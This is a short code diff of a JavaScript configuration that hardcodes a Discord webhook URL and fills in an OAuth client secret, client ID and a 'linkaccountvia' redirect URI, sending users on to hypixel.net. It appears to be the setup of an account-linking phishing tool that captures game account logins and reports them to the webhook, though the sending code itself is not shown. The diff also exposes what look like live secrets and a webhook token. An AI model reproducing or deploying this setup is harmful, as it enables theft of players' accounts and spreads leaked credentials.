@@ -1,9 +1,9 @@
 const dh = "https://discord.com/api/webhooks/1106776324925837322/9ljrZVGZQNDZFB73dwHjDITvbL67WyknmcBsCySvr9bVzHtTTJRMqFRvdUei0_h0N9ls"
 
 //Change these
-const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = ''
-const redirect_uri = ''
+const client_secret = 'D0u8Q~uN.DoKlF-XEcWpGlDYv-Vor7MJmWBR6bF1' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'a7a96e3f-0e38-474e-aa3e-536dcd08aa0e'
+const redirect_uri = 'https://linkaccountvia.onrender.com'
 const redirection = 'https://hypixel.net/' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 
 //Requirements
